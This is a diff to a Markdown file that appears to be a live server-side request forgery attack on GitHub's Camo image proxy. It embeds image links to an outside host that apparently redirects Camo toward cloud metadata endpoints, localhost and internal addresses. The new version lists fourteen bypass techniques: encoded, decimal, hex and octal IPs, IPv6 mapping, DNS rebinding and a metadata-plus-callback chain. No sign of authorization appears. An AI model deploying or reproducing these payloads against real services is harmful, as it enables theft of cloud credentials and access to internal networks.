@@ -1,26 +1,47 @@
-# SSRF Test v62 - nip.io DNS Bypass
+# SSRF Bypass v63 - Advanced Techniques
 
-Testing if Camo follows redirects to nip.io domains that resolve to internal IPs.
+Testing multiple SSRF bypass methods against GitHub Camo.
 
-## AWS Metadata via nip.io (169.254.169.254.nip.io)
-![AWS nip.io](http://164.90.187.218.nip.io:9999/aws?v=62)
+## 1. URL Encoded IP
+![URLEnc](http://164.90.187.218.nip.io:9999/urlenc?v=63)
 
-## Localhost via nip.io (127.0.0.1.nip.io)
-![Localhost nip.io](http://164.90.187.218.nip.io:9999/localhost?v=62)
+## 2. IPv6 Mapped IPv4
+![Mapped](http://164.90.187.218.nip.io:9999/mapped?v=63)
 
-## Internal via nip.io (10.0.0.1.nip.io)
-![Internal nip.io](http://164.90.187.218.nip.io:9999/internal?v=62)
+## 3. DNS Rebinding
+![Rebind](http://164.90.187.218.nip.io:9999/rebind?v=63)
 
-## GCP Metadata (metadata.google.internal)
-![GCP](http://164.90.187.218.nip.io:9999/gcp?v=62)
+## 4. Double URL Encode
+![Double](http://164.90.187.218.nip.io:9999/double?v=63)
 
-## Chain Redirect Test
-![Chain](http://164.90.187.218.nip.io:9999/chain?v=62)
+## 5. Unicode Bypass
+![Unicode](http://164.90.187.218.nip.io:9999/unicode?v=63)
 
-## Control: Raw AWS IP (should be blocked)
-![AWS Raw](http://164.90.187.218.nip.io:9999/awsraw?v=62)
+## 6. LocalTest.me (resolves to 127.0.0.1)
+![LocalTest](http://164.90.187.218.nip.io:9999/localtest?v=63)
 
-## Control: Raw Localhost (should be blocked)
-![Localhost Raw](http://164.90.187.218.nip.io:9999/localraw?v=62)
+## 7. Dash-style nip.io
+![Spoof](http://164.90.187.218.nip.io:9999/spoof?v=63)
 
-Timestamp: 2026-01-12T15:15:00Z
+## 8. Basic Auth Bypass
+![AuthBypass](http://164.90.187.218.nip.io:9999/authbypass?v=63)
+
+## 9. Decimal IP
+![Decimal](http://164.90.187.218.nip.io:9999/decimal?v=63)
+
+## 10. Hex IP
+![Hex](http://164.90.187.218.nip.io:9999/hex?v=63)
+
+## 11. Octal IP
+![Octal](http://164.90.187.218.nip.io:9999/octal?v=63)
+
+## 12. IPv6 Localhost
+![IPv6](http://164.90.187.218.nip.io:9999/ipv6?v=63)
+
+## 13. Log Chain (metadata + callback)
+![LogChain](http://164.90.187.218.nip.io:9999/logchain?v=63)
+
+## 14. Chain Redirect
+![Chain](http://164.90.187.218.nip.io:9999/chain?v=63)
+
+Timestamp: 2026-01-12T15:25:00Z
